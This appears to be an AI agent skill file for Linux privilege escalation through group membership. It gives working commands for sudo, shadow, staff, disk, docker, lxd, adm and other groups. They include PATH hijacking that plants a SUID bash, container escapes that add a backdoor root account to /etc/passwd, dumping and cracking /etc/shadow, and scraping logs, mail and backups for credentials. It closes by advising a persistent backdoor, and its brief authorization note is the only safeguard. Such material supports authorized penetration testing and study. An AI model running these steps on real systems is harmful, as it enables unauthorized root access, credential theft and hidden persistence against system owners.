---
name: linux-group-privesc
description: Linux privilege escalation via group membership analysis. Use this skill whenever the user mentions Linux privilege escalation, group membership, sudo access, or needs to check if their current user can escalate privileges through group-based vectors. This skill helps identify exploitable groups like sudo, admin, wheel, shadow, staff, disk, docker, and others that can lead to root access.
---

# Linux Group-Based Privilege Escalation

This skill helps you identify and exploit privilege escalation vectors based on Linux group memberships. Many Linux systems grant elevated privileges to users based on group membership rather than direct root access.

## Quick Start

1. **Check your current group memberships**
2. **Identify which groups have privilege escalation potential**
3. **Execute the appropriate exploitation method**

---

## Step 1: Enumerate Group Memberships

First, determine which groups your current user belongs to:

```bash
# Show all groups for current user
id

# Or list groups more verbosely
groups

# Check specific group membership
grep -E '^(sudo|admin|wheel|shadow|staff|disk|video|docker|lxc|lxd|adm|backup|operator|lp|mail|auth):' /etc/group
```

---

## Step 2: Check for Exploitable Groups

### Sudo/Admin Groups (Direct Root Access)

**Groups:** `sudo`, `admin`

**What it means:** Members can execute any command as root via sudo.

**Exploitation:**
```bash
# Direct sudo to root
sudo su

# Or sudo with specific command
sudo -i
```

**Alternative via pkexec:**
```bash
# Check if pkexec is SUID
find / -perm -4000 -name pkexec 2>/dev/null

# Check polkit policy
cat /etc/polkit-1/localauthority.conf.d/*

# Execute pkexec (may require GUI session)
pkexec /bin/bash
```

**pkexec without GUI (requires 2 SSH sessions):**
```bash
# Session 1
echo $$  # Get PID
pkexec /bin/bash  # Will wait for authentication

# Session 2 (run in parallel)
pkttyagent --process <PID-from-session1>
# Enter password when prompted in session 2
```

---

### Wheel Group (Direct Root Access)

**Group:** `wheel`

**What it means:** Members can execute any command as root via sudo (common on RHEL/CentOS/Fedora).

**Exploitation:**
```bash
sudo su
# or
sudo -i
```

---

### Shadow Group (Password Hash Access)

**Group:** `shadow`

**What it means:** Can read `/etc/shadow` to obtain password hashes for offline cracking.

**Exploitation:**
```bash
# Read shadow file
cat /etc/shadow

# Extract hashes and crack with hashcat/john
# Example hashcat command:
hashcat -m 500 /etc/shadow /path/to/wordlist.txt

# Example john command:
john --format=sha512crypt /etc/shadow
```

**Hash lock-state interpretation:**
- `!hash` - Password was set, then locked
- `*` - No valid password hash ever set
- `$6$` - SHA-512 hash (most common)
- `$1$` - MD5 hash
- `$5$` - SHA-256 hash

---

### Staff Group (PATH Hijacking)

**Group:** `staff`

**What it means:** Can write to `/usr/local/` directories which are prioritized in PATH.

**Exploitation:**
```bash
# Check PATH priority
echo $PATH

# Find run-parts cron jobs
cat /etc/crontab | grep run-parts

# Create malicious script in /usr/local/bin
cat > /usr/local/bin/run-parts << 'EOF'
#!/bin/bash
chmod 4777 /bin/bash
EOF
chmod +x /usr/local/bin/run-parts

# Trigger by opening new SSH session or waiting for cron

# Verify SUID was set
ls -la /bin/bash

# Get root shell
/bin/bash -p
```

**Alternative: Hijack other executables**
```bash
# Find executables in /usr/local that are called by root
# Then create malicious versions with same names
```

---

### Disk Group (Filesystem Access)

**Group:** `disk`

**What it means:** Can access block devices directly, effectively reading all filesystem data.

**Exploitation:**
```bash
# Find root partition
df -h

# Use debugfs to read files
debugfs /dev/sda1

# Inside debugfs:
debugfs: cd /root
debugfs: ls
debugfs: cat .ssh/id_rsa
debugfs: cat /etc/shadow
debugfs: quit

# Write files (read-only for root-owned files)
debugfs -w /dev/sda1
debugfs: dump /tmp/source.txt /tmp/dest.txt
debugfs: quit
```

---

### Video Group (Screen Capture)

**Group:** `video`

**What it means:** Can access framebuffer to capture screen contents.

**Exploitation:**
```bash
# Check who is logged in physically
w

# Capture screen to raw file
cat /dev/fb0 > /tmp/screen.raw

# Get screen resolution
cat /sys/class/graphics/fb0/virtual_size

# Open in GIMP as Raw image data with correct dimensions
# Look for passwords, sensitive data on screen
```

---

### Root Group (File Modification)

**Group:** `root`

**What it means:** Can modify certain files owned by root group.

**Exploitation:**
```bash
# Find writable files owned by root group
find / -group root -perm -g=w 2>/dev/null

# Check for:
# - Service configuration files
# - Library files (LD_PRELOAD opportunities)
# - SUID binaries you can modify
# - Cron jobs
```

---

### Docker Group (Container Escape)

**Group:** `docker`

**What it means:** Can mount host filesystem and escape to root.

**Exploitation:**
```bash
# List available images
docker images

# Mount host filesystem and get root shell
docker run -it --rm -v /:/mnt <image-name> chroot /mnt bash

# Alternative with full host access
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <image-name> chroot /mnt bash

# Create backdoor user (if you want persistence)
echo 'backdoor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
```

**If Docker socket is writable:**
```bash
# Check socket permissions
ls -la /var/run/docker.sock

# Use docker-privilege-escalation tools
# See: https://github.com/KrustyHack/docker-privilege-escalation
```

---

### LXC/LXD Group (Container Escape)

**Groups:** `lxc`, `lxd`

**What it means:** Can create containers with host access.

**Exploitation:**
```bash
# Check LXC/LXD access
which lxc
which lxd

# Create container with host mount
lxc launch images:lxc/debian:10 default-container

# Mount host root filesystem
lxc config device add default-container hostpath disk source / target /mnt/host

# Get shell inside container
lxc exec default-container -- /bin/bash

# Pivot to host
chroot /mnt/host
```

---

### Adm Group (Log Access)

**Group:** `adm`

**What it means:** Can read system logs which may contain credentials.

**Exploitation:**
```bash
# Read log files
cat /var/log/auth.log
cat /var/log/syslog
cat /var/log/secure

# Search for credentials
grep -i 'password' /var/log/*.log
grep -i 'token' /var/log/*.log
grep -i 'api_key' /var/log/*.log

# Check for sudo command history
cat /var/log/sudo.log
```

---

### Backup/Operator/LP/Mail Groups (Credential Discovery)

**Groups:** `backup`, `operator`, `lp`, `mail`

**What it means:** Access to backup archives, print spools, mail spools containing credentials.

**Exploitation:**
```bash
# Backup group - check backup directories
find / -name "*backup*" -type d 2>/dev/null
find / -name "*.tar*" -o -name "*.gz" -o -name "*.zip" 2>/dev/null

# Mail group - check mail spools
ls -la /var/mail/
cat /var/mail/<username>

# LP group - check print spools
ls -la /var/spool/cups/

# Search for credentials in accessible files
grep -r 'password\|api_key\|token\|secret' /var/backup/ 2>/dev/null
```

---

### Auth Group (OpenBSD Specific)

**Group:** `auth`

**What it means:** On OpenBSD, can write to authentication files.

**Exploitation:**
```bash
# Check if OpenBSD
uname -a

# Check writable auth files
ls -la /etc/skey/
ls -la /var/db/yubikey/

# Use CVE-2019-19520 exploit
# See: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot
```

---

## Quick Reference Script

Use the helper script to automate group checking:

```bash
# Run the group privesc checker
./scripts/check-group-privesc.sh
```

---

## Safety Notes

- **Always verify** you have authorization before testing privilege escalation
- **Document findings** for legitimate security assessments
- **Some exploits** may leave traces in logs
- **Container escapes** may require specific kernel configurations
- **Test in controlled environments** before production use

---

## Next Steps After Escalation

Once you have root access:

1. **Create a persistent backdoor** (if authorized)
2. **Audit the system** for other vulnerabilities
3. **Document the attack path** for remediation
4. **Clean up** any test files or modifications
